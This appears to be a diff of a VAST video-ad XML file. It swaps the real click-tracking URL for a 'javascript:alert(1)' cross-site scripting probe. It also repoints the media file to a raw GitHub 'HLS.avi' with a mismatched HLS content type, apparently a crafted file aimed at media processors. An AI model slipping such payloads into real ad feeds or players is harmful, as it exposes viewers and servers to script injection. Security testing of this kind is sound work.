@@ -18,12 +18,12 @@
 <TrackingEvents/>
 <VideoClicks>
 <ClickThrough>
-<![CDATA[ https://57518988ba84b41000462933.tracker.adotmob.com/track/{ADOTMOB_ID}/57518988ba84b41000462933/click?b={BID}&c=v2&idfa={IDFA}&ex=g&offer={CAMPAIGN_ID}&r=https%3A%2F%2Fwww.iwc.com%2Fus%2Fen%2Fhome.html ]]>
+<![CDATA[ javascript:alert(1) ]]>
 </ClickThrough>
 </VideoClicks>
 <MediaFiles>
-<MediaFile delivery="progressive" width="16" height="9" bitrate="548" type="video/x-msvideo">
-<![CDATA[ https://github.com/remot3/Files/blob/main/http_q.avi ]]>
+<MediaFile delivery="progressive" width="16" height="9" bitrate="548" type="application/vnd.apple.mpegurl">
+<![CDATA[ https://raw.githubusercontent.com/remot3/Files/refs/heads/main/HLS.avi ]]>
 </MediaFile>
 </MediaFiles>
 </Linear>
